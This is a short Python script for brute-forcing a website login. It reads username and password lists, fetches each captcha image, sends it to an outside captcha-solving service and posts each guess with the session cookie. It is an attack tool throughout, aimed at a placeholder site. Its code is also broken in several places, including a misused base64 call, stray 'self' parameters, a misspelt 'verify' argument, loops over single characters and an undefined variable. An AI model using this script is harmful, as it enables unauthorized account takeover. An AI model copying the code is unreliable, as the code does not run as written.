# -*- coding: utf-8 -*-
# @Time    : 2019-01-01 09:04
# @Author  : Light4ce
# @Email   : dark4ce@163.com
# @File    : brute_login_captcha.py

import requests
import base64
import json

username = open('username.txt','r')
passwd = open('password.txt','r')

# 联众打码平台https://www.jsdati.com/login
def uploadCaptcha(self, captchaImgName):
	headers = {
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding': 'gzip, deflate',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',
		'Content-Type': 'multipart/form-data; boundary=---------------------------227973204131376',
		'Connection': 'keep-alive',
		'Host': 'v2api.jsdama.com',
		'Upgrade-Insecure-Requests': '1'
	}

	data = dict(softwareId="", softwareSecret="", username="",
				password="", captchaData=base64(captchaImgName), captchaType=1001, captchaMinLength=0,
				captchaMaxLength=0, workerTipsId=0)

	api_url = 'https://v2-api.jsdama.com/upload'

	captcha_dict = json.loads(requests.post(url=api_url, data=data, headers=headers, verify=False))

	return captcha_dict['recognition']

#cookie验证方式登录
def tryLogin(self, captchaURL, loginURL, username, password):
	headers = {
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding': 'gzip, deflate',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',
		'Content-Type': 'multipart/form-data; boundary=---------------------------227973204131376',
		'Connection': 'keep-alive',
		'Host': 'v2api.jsdama.com',
		'Upgrade-Insecure-Requests': '1'
	}

	valcode =requests.get(captchaURL)
	f = open('captchaCode.png', 'wb')
	f.write(valcode.content)
	f.close()
	code = uploadCaptcha(base64(str(valcode.content)))

	data = {
		'username': username,
		'password': password,
		'captcha': code
	}

	r = requests.post(loginURL, data=data, cookies=requests.utils.dict_from_cookiejar(valcode.cookies), vertify=False)

	isFind = False
	if "failed" in r.content:  # 这里是对应网站的密码验证逻辑
		print('尝试密码', password, '登陆失败')
		isFind = False
	else:
		print (username, '登陆成功', 'password = ', pwd)
		isFind = True
	return isFind

if __name__ == '__main__':
	for user in username.readline():
		for pwd in passwd.readline():
			if tryLogin('http://www.xxx.com/img', 'http://wwww.xxx.com/login', user, pwd):
				break;